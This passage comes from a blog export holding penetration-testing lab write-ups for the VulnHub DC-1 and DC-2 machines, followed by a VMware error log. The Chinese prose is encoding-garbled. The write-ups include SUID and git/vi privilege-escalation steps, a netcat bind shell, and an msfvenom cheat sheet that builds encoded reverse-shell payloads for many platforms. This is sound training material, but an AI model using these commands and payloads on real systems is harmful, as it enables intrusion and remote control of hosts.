<h3 id="æ•°æ®åº“ä¿®æ”¹ç”¨æˆ·å¯†ç "><a href="#æ•°æ®åº“ä¿®æ”¹ç”¨æˆ·å¯†ç " class="headerlink" title="æ•°æ®åº“ä¿®æ”¹ç”¨æˆ·å¯†ç "></a>æ•°æ®åº“ä¿®æ”¹ç”¨æˆ·å¯†ç </h3><p>æ•°æ®åº“é‡Œçœ‹äº†çœ‹user,ç„¶åå‡†å¤‡ç™»å½•ä¸‹adminè´¦æˆ·ï¼Œhashè¿‡çš„å¯†ç ï¼Œéœ€è¦æ‰¾ä»–çš„åŠ å¯†å‡½æ•°</p>
<p>æ‰¾åˆ°è¿™ä¸ªå¯ä»¥ç”Ÿæˆ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637218563889-2021-11-1814:56:03.png"></p>
<p>ç”Ÿæˆä¸€ä¸‹ç›´æ¥å»æ•°æ®åº“é‡Œæ”¹å¯†ç hash</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637218903312-2021-11-1815:01:43.png"></p>
<p>æ”¹å®Œå¯†ç åç™»å½•ï¼Œåœ¨dashboradé‡Œé¢æ‰¾åˆ°ç¬¬ä¸‰ä¸ªæç¤º</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637219289828-2021-11-1815:08:09.png"></p>
<p>æ ¹æ®æç¤ºæ‰¾ä¸€ä¸‹è¿™ä¸ªshadow</p>
<p>åœ¨/etcä¸‹é¢</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637219397600-2021-11-1815:09:57.png"></p>
<p>ä½†æ˜¯æ‰§è¡Œä¸äº†ï¼Œæç¤ºæƒé™ä¸å¤Ÿ</p>
<p>æ‰¾åˆ°å½“å‰ç³»ç»Ÿæ‰€æœ‰çš„suidå¯æ‰§è¡Œæ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null </span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null </span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ç„¶ååˆ©ç”¨findææƒ</p>
<p><code>find /root/thefinalflag.txt -exec cat &#123;&#125; \;</code></p>
<p>è¯»å–äº†rootå®¶ç›®å½•ä¸‹çš„æœ€åflagæ–‡ä»¶</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637221110464-2021-11-1815:38:30.png"></p>
<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/find /root/thefinalflag.txt -exec netcat -lvp 4444 -e &quot;/bin/sh&quot;  \;</span><br></pre></td></tr></table></figure>



<p>å…³äºåå¼¹shell ,åˆ©ç”¨ä¸Šé¢çš„åŸç†å¯ä»¥å¼¹ä¸€ä¸ªshellä¼šæ”»å‡»æœº</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637221830965-2021-11-1815:50:30.png"></p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç†Ÿæ‚‰äº†ä¸€ä¸‹ç›¸å…³å·¥å…·çš„ä½¿ç”¨ï¼Œè¿˜æœ‰æ¸—é€çš„æ€è·¯</p>
<p>å‚è€ƒ</p>
<p><a href="https://www.bilibili.com/read/cv8951424">https://www.bilibili.com/read/cv8951424</a></p>
<p><a href="https://infosecwriteups.com/vulnhub-writeup-dc-1-37dcf92b456a">https://infosecwriteups.com/vulnhub-writeup-dc-1-37dcf92b456a</a></p>
<p><a href="https://lnng.top/posts/2ea3.html#toc-heading-11">https://lnng.top/posts/2ea3.html#toc-heading-11</a></p>
<hr>
<h4 id="msfçš„ä½¿ç”¨æ–¹æ³•"><a href="#msfçš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="msfçš„ä½¿ç”¨æ–¹æ³•"></a>msfçš„ä½¿ç”¨æ–¹æ³•</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">è¿›å…¥å‘½ä»¤è¡Œå·¥å…·</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æœç´¢æ¼æ´åç§°</span></span><br><span class="line">search [ç»„ä»¶æˆ–è€…æ¼æ´å…³é”®è¯]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä½¿ç”¨æ¼æ´</span></span><br><span class="line">use [æ¼æ´è·¯å¾„]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹éœ€è¦è¾“å…¥çš„é€‰é¡¹</span></span><br><span class="line">options</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">ç„¶åè®¾ç½®optionsåˆ—å‡ºæ¥çš„é€‰é¡¹</span></span><br><span class="line">set [é€‰é¡¹é”®]ã€€[é€‰é¡¹å€¼]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">è®¾ç½®å®Œæ‰€æœ‰çš„å‚æ•°</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h4 id="åé—¨ç”Ÿæˆçš„æ¨¡å—msfvenom"><a href="#åé—¨ç”Ÿæˆçš„æ¨¡å—msfvenom" class="headerlink" title="åé—¨ç”Ÿæˆçš„æ¨¡å—msfvenom"></a>åé—¨ç”Ÿæˆçš„æ¨¡å—msfvenom</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">æ™®é€šç”Ÿæˆ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        msfvenom -p æœ‰æ•ˆè½½è· -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">        msfvenom -p windows/meterpreter/reverse_tcp -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">ç¼–ç ç”Ÿæˆ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        msfvenom -a ç³»ç»Ÿæ¶æ„ --platform ç³»ç»Ÿå¹³å° -p æœ‰æ•ˆè½½è· lhost=æ”»å‡»æœºIP lport=æ”»å‡»æœºç«¯å£ -e ç¼–ç æ–¹å¼ -iç¼–ç æ¬¡æ•° -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom â€”list archs #æŸ¥çœ‹æ”¯æŒçš„ç³»ç»Ÿæ¶æ„</span><br><span class="line"></span><br><span class="line">        aarch64, armbe, armle, cbea, cbea64, cmd, dalvik, firefox, java, mips, mips64, mips64le, mipsbe, mipsle, nodejs, php, ppc, ppc64, ppc64le, ppce500v2, python, r, ruby, sparc, sparc64, tty, x64, x86, x86_64, zarch</span><br><span class="line"></span><br><span class="line">msfvenom â€”list platforms #æŸ¥çœ‹æ”¯æŒç³»ç»Ÿå¹³å°</span><br><span class="line"></span><br><span class="line">        aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, juniper, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows</span><br><span class="line"></span><br><span class="line">msfvenom -l payload #åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„payload</span><br><span class="line"></span><br><span class="line">msfvenom -l formats #åˆ—å‡ºæ‰€æœ‰çš„è¾“å‡ºæ ¼å¼</span><br><span class="line"></span><br><span class="line">msfvenom -l encrypt #åˆ—å‡ºæ‰€æœ‰çš„åŠ å¯†æ–¹å¼</span><br><span class="line"></span><br><span class="line">msfvenom -l encoders #åˆ—å‡ºæ‰€æœ‰çš„ç¼–ç å™¨</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å¸¸è§ç”Ÿæˆæ ¼å¼</span><br><span class="line"></span><br><span class="line">1ã€ Windows</span><br><span class="line"></span><br><span class="line">        msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">2ã€Linux</span><br><span class="line"></span><br><span class="line">        msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf</span><br><span class="line"></span><br><span class="line">3ã€Mac</span><br><span class="line"></span><br><span class="line">        msfvenom --platform osx -a x86 -p osx/x86/shell_reverse_tcp -f macho -o payload.macho</span><br><span class="line"></span><br><span class="line">4ã€Android</span><br><span class="line"></span><br><span class="line">        msfvenom -p android/meterpreter/reverse_tcp -o payload.apk</span><br><span class="line"></span><br><span class="line">5ã€Aspx</span><br><span class="line"></span><br><span class="line">        msfvenom --platform windows-p windows/meterpreter/reverse_tcp -f aspx -o payload.aspx</span><br><span class="line"></span><br><span class="line">6ã€JSP</span><br><span class="line"></span><br><span class="line">        msfvenom --platform java -p java/jsp_shell_reverse_tcp -f raw -o payload.jsp</span><br><span class="line"></span><br><span class="line">7ã€PHP</span><br><span class="line"></span><br><span class="line">        msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php</span><br><span class="line"></span><br><span class="line">8ã€BASH</span><br><span class="line"></span><br><span class="line">        msfvenom -p cmd/unix/reverse_bash -f raw -o shell.sh</span><br><span class="line"></span><br><span class="line">9ã€Python</span><br><span class="line"></span><br><span class="line">        msfvenom -p python/meterpreter/reverse_tcp -f raw -o shell.py</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-DC-2</title>
    <url>/2021/11/23/vulnhub-DC-2/</url>
    <content><![CDATA[<p>æ¥ç€æ‰“é¶åœºç†Ÿæ‚‰å·¥å…·å’Œæ¸—é€æ€è·¯</p>
<span id="more"></span>

<h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><p>nmapå…ˆä¸Šæ¥æ‰«ä¸€æ‰«å†…ç½‘ç½‘æ®µ</p>
<p><code>nmap -A 192.168.100.0/24</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637631730174-2021-11-2309:42:10.png"></p>
<p>è¿™ä¸ª104å°±æ˜¯dc-2é¶æœº</p>
<h2 id="æœåŠ¡å‘ç°"><a href="#æœåŠ¡å‘ç°" class="headerlink" title="æœåŠ¡å‘ç°"></a>æœåŠ¡å‘ç°</h2><p>æ²¡çœ‹å‡ºæ¥è¿™ä¸ª7744æ˜¯ä¸ªå•¥æœåŠ¡</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637631843445-2021-11-2309:44:03.png"></p>
<p>æŸ¥äº†ä¸€ä¸‹</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637632158790-2021-11-2309:49:18.png"></p>
<p>å¥½åƒå°±æ˜¯ä¸€ä¸ªç”¨æ¥ç›‘æ§åè®®ä¼ è¾“å•å…ƒè´¨é‡çš„?</p>
<p>ä¸ç®¡å®ƒï¼Œå…ˆè®¿é—®ä¸€ä¸‹è¿™ä¸ª80</p>
<p>åœ¨ä¸»æœºæ¢æµ‹çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†é‡å®šå‘ï¼Œä¼šå®šå‘åˆ°dc2è¿™ä¸ªåŸŸå</p>
<p>é‚£å°±æ”¹ä¸€ä¸‹æœ¬æœºhosts</p>
<p>/etc/hosts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.100.104 dc-2</span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸€ä¸‹ï¼Œæ‰“å¼€ç½‘é¡µï¼Œçœ‹åˆ°äº†ä¸€ä¸ªflagçš„tab</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637632445535-2021-11-2309:54:05.png"></p>
<p>è¯´æ˜¯è¦çˆ†ç ´ï¼Œå°è¯•å¯†ç ï¼Œå¯èƒ½æœ‰å¤šä¸ªå¸å·çˆ†å‡ºæ¥ï¼Œæœ‰çš„å¸å·è¿˜æ²¡æœ‰ä¸‹ä¸€ä¸ªflag</p>
<h2 id="çˆ†ç ´å…¥åå°"><a href="#çˆ†ç ´å…¥åå°" class="headerlink" title="çˆ†ç ´å…¥åå°"></a>çˆ†ç ´å…¥åå°</h2><p>ç„¶åè¿™é‡Œæˆ‘æ‡µäº†ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…çš„åšå®¢æ‰çŸ¥é“æœ‰ä¸ªå·¥å…·å«cewl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">å®‰è£…cewl</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ä»–æ˜¯ç”¨æ¥æ ¹æ®ç½‘ç«™çš„ä¿¡æ¯ç”Ÿæˆå­—å…¸çš„</span></span><br><span class="line">sudo apt install cewl</span><br><span class="line"><span class="meta">#</span><span class="bash">å®‰è£…wpscanå’Œä¾èµ–</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ä¸“é—¨æ‰“wordpressçš„è½¯ä»¶</span></span><br><span class="line">sudo apt install curl git libcurl4-openssl-dev make zlib1g-dev gawk g++ gcc libreadline6-dev libssl-dev libyaml-dev libsqlite3-dev sqlite3 autoconf libgdbm-dev libncurses5-dev automake libtool bison pkg-config ruby ruby-bundler ruby-dev</span><br><span class="line"></span><br><span class="line">sudo gem install wpscan</span><br></pre></td></tr></table></figure>

<p>é¢˜å¤–è¯ï¼Œè¿™ä¸ªæ—¶å€™å°±æ˜¯kaliæ–¹ä¾¿äº†..å·¥å…·è‡ªå¸¦</p>
<p>è¿™æ˜¯ä»€ä¹ˆç„å­¦é—®é¢˜???</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637633964518-2021-11-2310:19:24.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637634000037-2021-11-2310:20:00.png"></p>
<p>è¿˜æœ‰æˆ‘çš„cewlç”Ÿæˆçš„å­—å…¸ä¹Ÿæ˜¯ç©ºçš„â€¦å¯èƒ½æ˜¯ç¯å¢ƒçš„ç„å­¦é—®é¢˜..</p>
<p>?ä¸çŸ¥é“å’‹å›äº‹</p>
<p>è®°å½•ä¸€ä¸‹WPScançš„ä½¿ç”¨å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€“url æ‰«æç½‘ç«™</span><br><span class="line">-e æšä¸¾</span><br><span class="line">u æšä¸¾ç”¨æˆ·åï¼Œé»˜è®¤ä»1-10</span><br><span class="line">p æšä¸¾æ’ä»¶</span><br><span class="line">t æšä¸¾ä¸»é¢˜ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p>æšä¸¾ç”¨æˆ·å</p>
<p><code>wpscan --url http://dc-2 --enumerate u</code></p>
<p>çˆ†ç ´å¯†ç ï¼ˆå°†cewlçˆ†å‡ºæ¥çš„dict.txtå¯†ç å’Œä¸Šä¸€ä¸ªæšä¸¾çš„ç”¨æˆ·åæ”¾å…¥user.txtä¸­ï¼‰</p>
<p><code>wpscan --url http://dc-2/ -U users.txt -P dict.txt</code></p>
<blockquote>
<p>æˆ‘è¿™é‡Œæ˜¯æ²¡æˆåŠŸçˆ†å‡ºæ¥ï¼Œå› ä¸ºwpscanæ‰«ä¸å‡ºæ¥</p>
<p>cewlä¹Ÿæ˜¯</p>
</blockquote>
<p>jerry adipiscingæç¤ºäº†æ‰¾åˆ«çš„å…¥å£</p>
<p>tom parturientä½¿ç”¨7744ç™»å½•ssh</p>
<h2 id="æ‹¿åˆ°shell"><a href="#æ‹¿åˆ°shell" class="headerlink" title="æ‹¿åˆ°shell"></a>æ‹¿åˆ°shell</h2><p>cat,moreä¸èƒ½ç”¨ï¼Œ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635128021-2021-11-2310:38:48.png"></p>
<p>ç”¨viåœ¨å®¶ç›®å½•ä¸‹æ‰¾åˆ°äº†è¿™ä¸ªflag3.txt</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635000991-2021-11-2310:36:40.png"></p>
<p>å¯æ€œçš„æ±¤å§†ä¸€ç›´è½åä¸æ°ç‘å¯èƒ½éœ€è¦suæ¥è§£å†³è¿™ä¸ªé—®é¢˜</p>
<blockquote>
<p>æ±¤å§†æ°ç‘â€¦æˆ‘æ‰å‘ç°è¿™æ˜¯çŒ«å’Œè€é¼ (ä¸æ˜¯</p>
</blockquote>
<h2 id="viææƒ-åˆ‡ç”¨æˆ·"><a href="#viææƒ-åˆ‡ç”¨æˆ·" class="headerlink" title="viææƒ(åˆ‡ç”¨æˆ·)"></a>viææƒ(åˆ‡ç”¨æˆ·)</h2><p>viè¿›å…¥viç¼–è¾‘ç•Œé¢ä½ </p>
<p><code>:set shell=/bin/sh</code></p>
<p><code>:shell</code></p>
<p>è¿›å…¥shellä¹‹åä¿®æ”¹ç¯å¢ƒå˜é‡è¾“å‡º</p>
<p><code>export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</code></p>
<p>ç„¶ååˆ‡æ¢ç”¨æˆ·jerry</p>
<p><code>su jerry</code>è¾“å…¥åˆšæ‰jerryçš„å¯†ç </p>
<p><code>find / -name flag4.txt</code>æ‰¾åˆ°flagä½ç½®</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635816845-2021-11-2310:50:16.png"></p>
<h2 id="gitææƒ-root"><a href="#gitææƒ-root" class="headerlink" title="gitææƒ(root)"></a>gitææƒ(root)</h2><p>æç¤ºgitææƒ</p>
<p>è¾“å…¥<code>sudo git help config</code></p>
<p>åœ¨æ‰“å¼€çš„æ‰‹å†Œç•Œé¢<code>!/bin/bash</code></p>
<p>å‰ææ˜¯æ‰§è¡Œsudo -l æç¤ºä¸éœ€è¦å¯†ç å¯ä»¥ä½¿ç”¨gitå‘½ä»¤</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635968105-2021-11-2310:52:48.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635913056-2021-11-2310:51:53.png"></p>
<p>æ‰¾æ‰¾æœ€åçš„flag</p>
<p><code>find / -name *flag*</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637636300268-2021-11-2310:58:20.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://lnng.top/posts/2ea3.html#toc-heading-16">https://lnng.top/posts/2ea3.html#toc-heading-16</a></p>
]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>popOS_vmwareæ— æ³•å¯åŠ¨é—®é¢˜</title>
    <url>/2022/06/04/popOS-vmware%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>æ‰“å¼€vmware</p>
<p>å‘ç°å¯åŠ¨ä¸äº†â€¦</p>
<p>å†™è¿™æ˜¯updater æ·¦ï¼Œæ€•ä¸æ˜¯vmwareè‡ªåŠ¨å‡çº§å¯¼è‡´ä»–æ²¡æ³•å¯åŠ¨äº†</p>
<p>æŠ¥é”™<code>[Before you can run VMware several modules must be compiled]</code></p>
<p>ç‚¹å‡»installä¹‹åç»§ç»­æŠ¥é”™</p>
<span id="more"></span>

<p>é‡å¯å¤§æ³• ï¼Œæ— æ•ˆ ï¼Œ å¥½å§</p>
<p>å’‹æ ¹æ®ä»–ç»™çš„æŠ¥é”™æ—¥å¿—è·¯å¾„æ‰¾åˆ°æŠ¥é”™æ—¥å¿—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/userif.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/bridge.c:53:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/bridge.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetUserListener.c:39:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/vnetUserListener.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/smac_compat.c:53:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/smac_compat.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/hub.c:43:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/hub.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/netif.c:43:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/procfs.c:43:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/driver.c:48:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/netif.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/procfs.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/driver.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[1]: *** [Makefile:1852: /tmp/modconfig-0wFZx5/vmnet-only] Error 2</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make: *** [Makefile:117: vmnet.ko] Error 2</span><br><span 